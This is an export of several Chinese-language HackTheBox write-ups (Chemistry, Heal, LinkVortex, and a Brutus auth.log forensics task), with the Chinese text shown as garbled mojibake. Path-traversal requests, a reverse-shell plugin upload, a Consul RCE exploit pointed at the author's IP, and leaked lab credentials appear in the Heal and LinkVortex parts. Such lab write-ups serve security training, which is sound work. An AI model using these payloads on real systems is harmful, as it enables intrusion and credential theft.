è¿™æ˜¯ä¸€ä¸ªåˆ©ç”¨çš„ç‚¹ï¼Œæœç´¢aiohttpçš„ç›¸å…³ç‰ˆæœ¬æ¼æ´\nCVE-2024-23334: A Deep Dive into aiohttp\u0026rsquo;s Directory Traversal Vulnerability (ethicalhacking.uk) æ‰¾åˆ°ä¸€ä¸ªç›®å½•ç©¿è¶Šçš„æ¼æ´ï¼Œä¸è¿‡è¿™é‡Œæœ‰ä¸€ä¸ªå‘ï¼Œå› ä¸ºæ‰€æœ‰çš„pocéƒ½æ˜¯åŸºäº/staticç›®å½•è¿›è¡Œç©¿è¶Šçš„ï¼Œè€Œè¿™é‡Œçš„å†…ç½‘ç«¯å£ä¸Šæ²¡æœ‰è¿™ä¸ªç›®å½•\nå­˜åœ¨/assetsç›®å½•ï¼Œæˆ‘ä»¬å¯ä»¥åŸºäºè¿™ä¸ªç›®å½•æ¥è¿›è¡Œç›®å½•ç©¿è¶Š\næ ¹æ®ä¸Šé¢æ–‡ç« é‡Œçš„æµ‹è¯•ä¸€ä¸‹ï¼Œè¯»å–æˆåŠŸ\nè¿™é‡Œæˆ‘æœ¬æ¥æƒ³è¯»å–å¯†ç Hashç„¶åçˆ†ç ´ä¸€ä¸‹rootçš„å¯†ç çš„ï¼Œä½†æ˜¯å¥½åƒçˆ†ä¸å‡ºæ¥ğŸ˜‚ï¼Œç›´æ¥è¯»å–flagå§\n[root@kali] /home/kali/Chemistry â¯ curl -s --path-as-is \u0026#34;http://127.0.0.1:8000/assets/../../../../../root/root.txt\u0026#34; Summary #\rUserï¼šå°±æ˜¯ç®€å•çš„æ–‡ä»¶ä¸Šä¼ CVEåå¼¹Shellï¼Œç„¶åæ•°æ®åº“ä¿¡æ¯æ³„éœ²ï¼Œçˆ†ç ´ç”¨æˆ·å¯†ç è¿›è¡Œsshç™»å½•ã€‚\nRootï¼šWebserverçš„ç‰ˆæœ¬æ¼æ´ï¼Œå¯ä»¥é€ æˆä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¸è¿‡æœ‰å‰ææ˜¯å¿…é¡»è¦è¸æ¿ç›®å½•å­˜åœ¨ï¼Œæ¯”å¦‚è¯´è¿™ä¸ªMachineä¸­ä¸å­˜åœ¨å…¶ä»–Pocä¸­çš„/staticï¼Œæ‰€ä»¥éœ€è¦å€ŸåŠ©/assetsç›®å½•æ¥è¿›è¡Œç©¿è¶Šã€‚å‡å¦‚æ²¡æœ‰ä»»ä½•å¯è®¿é—®ç›®å½•çš„è¯ï¼Œåº”è¯¥ä¹Ÿå°±æ— æ³•å¤ç°è¿™ä¸ªCVEäº†ã€‚ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡è¯»å–sshå¯†é’¥åè¿›è¡Œrootç™»å½•ã€‚\n","date":"2024-12-17","externalUrl":null,"permalink":"/posts/2024/12/htb-chemistry/","section":"Posts","summary":"","title":"HTB-Chemistry","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Heal â¯ nmap -sSCV -Pn heal.htb Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-15 17:29 CST\rNmap scan report for heal.htb (10.10.11.46)\rHost is up (0.085s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)\r|_ 256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)\r80/tcp open http nginx 1.18.0 (Ubuntu)\r|_http-title: Heal\r|_http-server-header: nginx/1.18.0 (Ubuntu)\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 12.40 seconds å¼€æ”¾ç«¯å£ï¼š22ã€80\nSubdomainFuzz #\r[root@kali] /home/kali/Desktop â¯ ffuf -u http://heal.htb/ -w ./fuzzDicts/subdomainDicts/main.txt -H \u0026#34;Host:FUZZ.heal.htb\u0026#34; -mc 200\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://heal.htb/\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/subdomainDicts/main.txt\r:: Header : Host: FUZZ.heal.htb\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200\r________________________________________________\rapi [Status: 200, Size: 12515, Words: 469, Lines: 91, Duration: 127ms]\r:: Progress: [167378/167378] :: Job [1/1] :: 446 req/sec :: Duration: [0:05:42] :: Errors: 0 :: å­˜åœ¨åŸŸåï¼šapi.heal.htbï¼Œæ·»åŠ åˆ°/etc/hosts\nåœ¨heal.htb/surveyè·¯ç”±ä¸‹å‘ç°ä¸€ä¸ªå­åŸŸåï¼štake-survey.heal.htb\næ·»åŠ åˆ°/etc/hostsï¼Œè®¿é—®å¦‚ä¸‹å‘ç°Administratorçš„ç”¨æˆ·åï¼šralph\nDirsearch #\r[root@kali] /home/kali/Desktop â¯ dirsearch -u \u0026#34;http://take-survey.heal.htb/index.php/\u0026#34; -t 50 -i 200\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/Desktop/reports/http_take-survey.heal.htb/_index.php__24-12-15_19-42-06.txt\rTarget: http://take-survey.heal.htb/\r[19:42:06] Starting: index.php/ [19:42:19] 200 - 75KB - /index.php/admin/mysql/index.php [19:42:23] 200 - 74KB - /index.php/apc/index.php [19:42:42] 200 - 74KB - /index.php/pma/index.php [19:42:54] 200 - 75KB - /index.php/web/phpMyAdmin/index.php Task Completed è®¿é—®/index.php/adminä¼šè‡ªåŠ¨è·³è½¬åˆ°ä¸€ä¸ªç™»é™†ç•Œé¢\nhttp://take-survey.heal.htb/index.php/admin/authentication/sa/login\nReadAnyFiles #\rä»»æ„æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç„¶åè¿›å…¥http://heal.htb/resume\nä½¿ç”¨burpsuiteæ‰“å¼€interceptï¼Œç„¶åç‚¹å‡»EXPORT AS PDF\nåœ¨æ”¾è¡Œåˆ°ç¬¬ä¸‰ä¸ªåŒ…çš„æ—¶å€™å‘ç°ä¸€ä¸ª/downloadè·¯ç”±ï¼Œå¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–\nGET /download?filename=../../../../../etc/passwd å‘ç°ä¸¤ä¸ªç”¨æˆ·çš„ç”¨æˆ·åï¼šralphã€ron\nç”±äºæˆ‘ä»¬å‘ç°äº†è¯¥ç½‘ç«™ä½¿ç”¨äº†Ruby on Railsï¼Œç»è¿‡æœç´¢å¾—åˆ°å…¶configçš„æ–‡ä»¶åœ°å€\nGET /download?filename=../../config/database.yml å°†å…¶ä¸‹è½½ä¸‹æ¥\nGET /download?filename=../../storage/development.sqlite3 å¾—åˆ°äº†ralphçš„å¯†ç hash\nä½¿ç”¨Johnç ´è§£å¯†ç \n[root@kali] /home/kali/Heal â¯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt â\rUsing default input encoding: UTF-8\rLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\rCost 1 (iteration count) is 4096 for all loaded hashes\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\r0g 0:00:00:08 0.00% (ETA: 2024-12-19 09:21) 0g/s 53.66p/s 53.66c/s 53.66C/s 12345678910..christina\r147258369 (?) 1g 0:00:00:09 DONE (2024-12-15 20:25) 0.1063g/s 53.61p/s 53.61c/s 53.61C/s pasaway..claire\rUse the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably\rSession completed. æ— æ³•è¿›è¡ŒSSHç™»å½•ï¼Œä¸è¿‡å¯ä»¥ç™»å½•åˆ°ç½‘ç«™åå°\nLimeSurvey-RCE #\råœ¨Githubä¸Šæ‰¾åˆ°ä¸€ä¸ªè„šæœ¬\n[github author=\u0026ldquo;Y1LD1R1M-1337\u0026rdquo; project=\u0026ldquo;Limesurvey-RCE\u0026rdquo;][/github]\néœ€è¦è¿›è¡Œå¦‚ä¸‹ä¿®æ”¹ï¼Œä¸€å®šè¦æ·»åŠ ä¸€ä¸ªcompatibilityçš„ç‰ˆæœ¬ä¸º6.0å’Œç½‘ç«™åŒ¹é…ï¼Œå¦åˆ™æ— æ³•ä¸Šä¼ æˆåŠŸ\nä¿®æ”¹åå¼¹SHELLé‡Œçš„IPå’Œç«¯å£å·\nç„¶åè¿›è¡Œæ‰“åŒ…\nâ¯ zip hyh_zip config.xml php-rev.php ä¸Šä¼ å¹¶ä¸”æ¿€æ´»æ’ä»¶\nç„¶åè®¿é—®http://take-survey.heal.htb/upload/plugins/hyh_hacker/php-rev.phpè·¯å¾„å³å¯åå¼¹shell\npython3 -c \u0026#34;import pty;pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; åœ¨/var/www/limesurvey/application/config/config.phpä¸­è·å–åˆ°æ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç \nè¿™é‡Œç¦»è°±çš„å±…ç„¶æ˜¯ï¼Œè¿›å»æŸ¥æ‰¾åˆ°usersè¡¨é‡Œé¢åªå­˜åœ¨ä¸€ä¸ªralphç”¨æˆ·ï¼Œä»–çš„å¯†ç hashçˆ†ç ´å‡ºæ¥å’Œä¸Šé¢çš„147258369æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚ä¹Ÿå°±æ˜¯è¯´æ•°æ®åº“ä¸­æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ä¸œè¥¿ã€‚\nä¸è¿‡è¿™é‡Œçš„å¯†ç å¯ä»¥è®©ronç”¨æˆ·è¿›è¡Œsshç™»å½•ï¼Œè€Œä¸æ˜¯ralphğŸ˜¡\nusernameï¼šron\rpasswordï¼šAdmiDi0_pA$$w0rd Privilege Escalation #\rä¸Šä¼ Linpeas.shï¼Œå‘ç°å¼€æ”¾äº†è®¸å¤šç«¯å£\nå°†8500ç«¯å£é€šè¿‡sshè½¬å‘å‡ºæ¥\n[root@kali] /home/kali/Heal â¯ ssh -L 8500:127.0.0.1:8500 ron@heal.htb åœ¨ç½‘é¡µæºç é‡Œå‘ç°äº†ç‰ˆæœ¬ä¿¡æ¯ï¼š1.19.2\né€šè¿‡æŸ¥æ‰¾ç‰ˆæœ¬æ¼æ´ï¼Œæˆ‘åœ¨Exploit-DBä¸­å‘ç°äº†å¯ä»¥åˆ©ç”¨çš„è„šæœ¬\nHashicorp Consul v1.0 - Remote Command Execution (RCE) - Multiple remote Exploit (exploit-db.com) [root@kali] /home/kali/Heal â¯ python exploit.py 127.0.0.1 8500 10.10.16.29 6666 0\r[+] Request sent successfully, check your listener è®¾ç½®NCç›‘å¬å¾—åˆ°åå¼¹SHELL\nä¸€å¼€å§‹æˆ‘æ³¨æ„åˆ°è¿™ä¸ªè„šæœ¬é‡Œé¢å­˜åœ¨ä¸€ä¸ªACL tokençš„å‚æ•°ï¼Œè¿˜å°è¯•è¿‡sshåç”¨å‘½ä»¤è¡Œç”Ÿæˆä¸€ä¸ªtokenï¼Œä½†å¤±è´¥äº†ã€‚ç„¶åå¶ç„¶å‘ç°è¿™ä¸ªtokenå¯¹äºæœ¬æœºæ¥è¯´å¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆæ•ˆæœï¼Œéšä¾¿èµ‹å€¼éƒ½èƒ½æˆåŠŸæ‰§è¡Œè„šæœ¬ã€‚\nSummary #\rUserï¼šåœ¨é‡åˆ°ä¸‹è½½æ–‡ä»¶çš„è·¯ç”±æ—¶å€™ï¼Œè¦ä»”ç»†æ£€æŸ¥æ˜¯å¦å­˜åœ¨è·¯å¾„å¯ä»¥ç©¿è¶Šï¼Œæ¯”å¦‚æœ¬æœºä¸­çš„/downloadï¼Œå°±å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œé…åˆRailsçš„Configæ–‡ä»¶åœ°å€ï¼Œå°†æ•°æ®åº“ä¿¡æ¯ä¸‹è½½åˆ°æˆåŠŸè¿›å…¥åå°ï¼Œç„¶åä¸Šä¼ æ¶æ„æ’ä»¶Webshellï¼Œè¿™ä¸ªåœ¨ä¹‹å‰çš„ä¸€ä¸ªæœºå™¨ä¸Šä¹Ÿæ˜¯é‡åˆ°è¿‡çš„ï¼Œæœ€ååå¼¹Shellè¯»å–é…ç½®æ–‡ä»¶SSHç™»å½•æ‹¿åˆ°Userã€‚\nRootï¼šLinuxæœºå™¨ç›¸è¾ƒäºWindowsæœºå™¨å°±æ²¡æœ‰é‚£ä¹ˆå¤šåŸŸå†…çš„ä¸€äº›æƒé™é—®é¢˜ï¼Œå¾€å¾€æ˜¯ä¸€äº›å¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™ä¸æ­£ç¡®æˆ–è€…æ˜¯å†…ç½‘ç«¯å£æœåŠ¡çš„ä¸€äº›Webæ¼æ´ã€‚æœ¬æœºçš„Rootå°±æ˜¯é€šè¿‡è½¬å‘8500ç«¯å£åˆ°kaliï¼Œç„¶åæŸ¥æ‰¾å†å²ç‰ˆæœ¬çš„CVEæ¼æ´ï¼Œæœ€ååå¼¹Shellæ‹¿åˆ°Rootæƒé™ã€‚\n","date":"2024-12-15","externalUrl":null,"permalink":"/posts/2024/12/htb-heal/","section":"Posts","summary":"","title":"HTB-Heal","type":"posts"},{"content":"\rSherlock Scenario #\råœ¨è¿™ä¸ªéå¸¸ç®€å•çš„ Sherlock ä¸­ï¼Œæ‚¨å°†ç†Ÿæ‚‰ Unix auth.log å’Œ wtmp æ—¥å¿—ã€‚æˆ‘ä»¬å°†æ¢ç´¢ä¸€ä¸ªåœºæ™¯ï¼Œå…¶ä¸­ Confluence æœåŠ¡å™¨é€šè¿‡å…¶ SSH æœåŠ¡è¢«æš´åŠ›ç ´è§£ã€‚è·å¾—å¯¹æœåŠ¡å™¨çš„è®¿é—®æƒé™åï¼Œæ”»å‡»è€…æ‰§è¡Œäº†å…¶ä»–æ´»åŠ¨ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ auth.log è¿›è¡Œè·Ÿè¸ªã€‚å°½ç®¡ auth.log ä¸»è¦ç”¨äºæš´åŠ›åˆ†æï¼Œä½†æˆ‘ä»¬å°†åœ¨è°ƒæŸ¥ä¸­æ·±å…¥ç ”ç©¶æ­¤å·¥ä»¶çš„å…¨éƒ¨æ½œåŠ›ï¼ŒåŒ…æ‹¬æƒé™æå‡ã€æŒä¹…æ€§æ–¹é¢ï¼Œç”šè‡³å¯¹å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›å¯è§æ€§ã€‚\nTask1 #\råˆ†æauth.logï¼Œæ‚¨èƒ½å¦è¯†åˆ«æ”»å‡»è€…ç”¨äºå®æ–½æš´åŠ›æ”»å‡»çš„ IP åœ°å€ï¼Ÿ\n[root@kali] /home/kali/Brutus â¯ cat auth.log | grep \u0026#34;Invalid\u0026#34; Mar 6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380\rMar 6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392\rMar 6 06:31:31 ip-172-31-35-28 sshd[2332]: Invalid user admin from 65.2.161.68 port 46444\rMar 6 06:31:31 ip-172-31-35-28 sshd[2331]: Invalid user admin from 65.2.161.68 port 46436\rMar 6 06:31:31 ip-172-31-35-28 sshd[2330]: Invalid user admin from 65.2.161.68 port 46422\rMar 6 06:31:31 ip-172-31-35-28 sshd[2337]: Invalid user admin from 65.2.161.68 port 46498\rMar 6 06:31:31 ip-172-31-35-28 sshd[2328]: Invalid user admin from 65.2.161.68 port 46390 IPï¼š65.2.161.68\nTask2 #\ræš´åŠ›ç ´è§£å°è¯•æˆåŠŸï¼Œæ”»å‡»è€…è·å¾—äº†å¯¹æœåŠ¡å™¨ä¸Šå¸æˆ·çš„è®¿é—®æƒé™ã€‚è¿™ä¸ªè´¦æˆ·çš„ç”¨æˆ·åæ˜¯ä»€ä¹ˆï¼Ÿ\nå¯ä»¥å‘ç°æ”»å‡»æºIP(65.2.161.68)å¯¹æœ¬æœºè¿›è¡Œäº†ä¸‰æ¬¡å¯†ç çˆ†ç ´ä¹‹åï¼ŒæˆåŠŸç™»å½•äº†Rootç”¨æˆ·\nTask3 #\ræ‚¨èƒ½å¦è¯†åˆ«æ”»å‡»è€…æ‰‹åŠ¨ç™»å½•æœåŠ¡å™¨ä»¥æ‰§è¡Œå…¶ç›®æ ‡æ—¶çš„æ—¶é—´æˆ³ï¼Ÿ\n[root@kali] /home/kali/Brutus â¯ cat auth.log | grep -n \u0026#34;65.2.161.68\u0026#34; | grep \u0026#34;Accepted password\u0026#34;\r281:Mar 6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2\r322:Mar 6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2\r360:Mar 6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2 å› ä¸ºä¹‹å‰è¿›è¡Œäº†çˆ†ç ´å¯†ç ï¼Œåœ¨322è¡Œåº”è¯¥æ˜¯æ‰‹åŠ¨ç™»å½•çš„æœåŠ¡å™¨\nè¿™ä¸ªæ—¶é—´2024-03-06 06:32:44ç›´æ¥äº¤ä¸Šå»ä¸å¯¹\n[root@kali] /home/kali/Brutus â¯ utmpdump wtmp æŸ¥çœ‹wtmpæ–‡ä»¶åŸå§‹å†…å®¹\nå‘ç°æ—¶é—´åº”è¯¥æ˜¯ï¼š2024-03-06 06:32:45\nTask4 #\rç™»å½•æ—¶å°†è·Ÿè¸ª SSH ç™»å½•ä¼šè¯å¹¶ä¸ºå…¶åˆ†é…ä¼šè¯ç¼–å·ã€‚ä¸ºé—®é¢˜ 2 ä¸­çš„ç”¨æˆ·å¸æˆ·åˆ†é…ç»™æ”»å‡»è€…ä¼šè¯çš„ä¼šè¯å·æ˜¯ä»€ä¹ˆï¼Ÿ\n[root@kali] /home/kali/Brutus â¯ cat auth.log | grep -n \u0026#34;root\u0026#34; | grep \u0026#34;session\u0026#34; å› ä¸ºæ‰‹åŠ¨ç™»å½•æ˜¯åœ¨322è¡Œï¼Œå› æ­¤çœ‹322è¡Œä¹‹åçš„å†…å®¹\nTask5 #\ræ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ·»åŠ äº†ä¸€ä¸ªæ–°ç”¨æˆ·ä½œä¸ºå…¶æŒä¹…æ€§ç­–ç•¥çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸ºæ­¤æ–°ç”¨æˆ·å¸æˆ·æä¾›äº†æ›´é«˜çš„æƒé™ã€‚æ­¤å¸æˆ·çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ\n[root@kali] /home/kali/Brutus â¯ cat auth.log | grep -n \u0026#34;new\u0026#34; 335:Mar 6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002\r336:Mar 6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1 å‘ç°ä¸€ä¸ªæ–°ç”¨æˆ·ï¼šcyberjunkie\n[root@kali] /home/kali/Brutus â¯ cat auth.log | grep -n \u0026#34;cyberjunkie\u0026#34; cyberjunkieè¢«æ·»åŠ åˆ°äº†sudoç»„å†…ï¼Œå…·æœ‰è¶…çº§æƒé™\nTask6 #\rç”¨äºæŒä¹…æ€§çš„ MITRE ATT\u0026amp;CK å­æŠ€æœ¯ ID æ˜¯ä»€ä¹ˆï¼Ÿ\nMatrix - Enterprise | MITRE ATT\u0026amp;CKÂ® IDï¼šT1136.001\nTask7 #\ræ ¹æ®ä¹‹å‰ç¡®è®¤çš„èº«ä»½éªŒè¯æ—¶é—´å’Œä¼šè¯åœ¨ auth.log å†…ç»“æŸï¼Œæ”»å‡»è€…çš„ç¬¬ä¸€ä¸ª SSH ä¼šè¯æŒç»­äº†å¤šä¹…ï¼ˆç§’ï¼‰\nåœ¨wtmpä¸­å¯ä»¥çœ‹è§\n6:32:45 --- 6:37:24 æ€»å…±æŒç»­æ—¶é—´æ˜¯279ç§’\nTask8 #\ræ”»å‡»è€…ç™»å½•äº†ä»–ä»¬çš„åé—¨å¸æˆ·ï¼Œå¹¶åˆ©ç”¨æ›´é«˜æƒé™ä¸‹è½½äº†è„šæœ¬ã€‚ä½¿ç”¨ sudo æ‰§è¡Œçš„å®Œæ•´å‘½ä»¤æ˜¯ä»€ä¹ˆï¼Ÿ\n[root@kali] /home/kali/Brutus â¯ cat auth.log | grep -n \u0026#34;cyberjunkie\u0026#34; å‘ç°ä½¿ç”¨cyberjunkieè´¦æˆ·è¿œç¨‹ä¸‹è½½äº†Linpeasåˆ†æè„šæœ¬\n","date":"2024-12-10","externalUrl":null,"permalink":"/posts/2024/12/sherlocks-brutus/","section":"Posts","summary":"","title":"Sherlocks-Brutus","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali â¯ nmap -sSCV -Pn LinkVortex.htb Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 21:44 CST\rNmap scan report for LinkVortex.htb (10.10.11.47)\rHost is up (0.088s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)\r|_ 256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)\r80/tcp open http Apache httpd\r|_http-server-header: Apache\r| http-title: BitByBit Hardware\r|_Requested resource was http://linkvortex.htb/\r| http-robots.txt: 4 disallowed entries |_/ghost/ /p/ /email/ /r/\r|_http-generator: Ghost 5.58\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 20.62 seconds Subdomain Fuzz #\r[root@kali] /home/kali/LinkVortex â¯ ffuf -u http://linkvortex.htb/ -w ./fuzzDicts/subdomainDicts/main.txt -H \u0026#34;Host:FUZZ.linkvortex.htb\u0026#34; -mc 200 â\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://linkvortex.htb/\r:: Wordlist : FUZZ: /home/kali/LinkVortex/fuzzDicts/subdomainDicts/main.txt\r:: Header : Host: FUZZ.linkvortex.htb\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200\r________________________________________________\rdev [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 73ms]\r:: Progress: [167378/167378] :: Job [1/1] :: 500 req/sec :: Duration: [0:05:55] :: Errors: 46 :: å‘ç°å­˜åœ¨ï¼šdev.linkvortex.htbï¼Œæ·»åŠ åˆ°/etc/hosts\nDirsearch #\r[root@kali] /home/kali/LinkVortex â¯ dirsearch -u linkvortex.htb -t 50 -i 200\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/LinkVortex/reports/_linkvortex.htb/_24-12-08_21-50-06.txt\rTarget: http://linkvortex.htb/\r[21:50:06] Starting: [21:50:28] 200 - 15KB - /favicon.ico [21:50:34] 200 - 1KB - /LICENSE [21:50:44] 200 - 103B - /robots.txt [21:50:46] 200 - 255B - /sitemap.xml æŸ¥çœ‹/robots.txt\nUser-agent: *\rSitemap: http://linkvortex.htb/sitemap.xml\rDisallow: /ghost/\rDisallow: /p/\rDisallow: /email/\rDisallow: /r/ è¿›å…¥/ghostè·¯ç”±ï¼Œå­˜åœ¨ç™»å½•é¡µé¢\nå¯¹dev.linkvortex.htbè¿›è¡Œç›®å½•æ‰«æ\n[root@kali] /home/kali/LinkVortex â¯ dirsearch -u dev.linkvortex.htb -t 50 -i 200\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3\r(_||| _) (/_(_|| (_| )\rExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/LinkVortex/reports/_dev.linkvortex.htb/_24-12-09_10-27-46.txt\rTarget: http://dev.linkvortex.htb/\r[10:27:46] Starting: [10:27:48] 200 - 557B - /.git/ [10:27:48] 200 - 73B - /.git/description [10:27:48] 200 - 201B - /.git/config\r[10:27:48] 200 - 41B - /.git/HEAD\r[10:27:48] 200 - 620B - /.git/hooks/ [10:27:48] 200 - 402B - /.git/info/ [10:27:48] 200 - 240B - /.git/info/exclude [10:27:48] 200 - 401B - /.git/logs/ [10:27:48] 200 - 175B - /.git/logs/HEAD\r[10:27:48] 200 - 418B - /.git/objects/ [10:27:48] 200 - 393B - /.git/refs/ [10:27:48] 200 - 147B - /.git/packed-refs [10:27:49] 200 - 691KB - /.git/index GitHack #\rå­˜åœ¨Gitæ³„éœ²ï¼Œä½¿ç”¨GitHackå·¥å…·å°†å…¶æ‹‰å–ä¸‹æ¥\n[root@kali] /home/kali/LinkVortex/GitHack (master) âš¡ â¯ python GitHack.py -u \u0026#34;http://dev.linkvortex.htb/.git/\u0026#34; å¯ä»¥å‘ç°é‡Œé¢å­˜åœ¨ä¸€äº›passwordå…³é”®å­—\nå¯ä»¥ä½¿ç”¨ç¬¬ä¸€ä¸ªå¯†ç è¿›è¡Œç™»å½•\nusername: admin@linkvortex.htb\rpassword: OctopiFociPilfer45 æˆåŠŸè¿›å…¥åå°\né€šè¿‡Wappalyzeræ‰©å±•å¯ä»¥å‘ç°ï¼Œå½“å‰GhostCMSçš„ç‰ˆæœ¬æ˜¯5.58\nUser #\rCVE-2023-40028 #\ré€šè¿‡GoogleæŸ¥è¯¢ï¼Œæˆ‘å‘ç°äº†è¿™ä¸ª\n[github author=\u0026ldquo;0xyassine\u0026rdquo; project=\u0026ldquo;CVE-2023-40028\u0026rdquo;][/github]\néœ€è¦ä¿®æ”¹çš„åœ°æ–¹\n[root@kali] /home/kali/LinkVortex/CVE-2023-40028 (master) âš¡ â¯ ./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45\rWELCOME TO THE CVE-2023-40028 SHELL\rfile\u0026gt; /etc/passwd\rroot:x:0:0:root:/root:/bin/bash\rdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\rbin:x:2:2:bin:/bin:/usr/sbin/nologin\rsys:x:3:3:sys:/dev:/usr/sbin/nologin\rsync:x:4:65534:sync:/bin:/bin/sync\rgames:x:5:60:games:/usr/games:/usr/sbin/nologin\rman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\rlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\rmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\rnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\ruucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\rproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\rwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\rbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\rirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\rgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\rnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\r_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\rnode:x:1000:1000::/home/node:/bin/bash 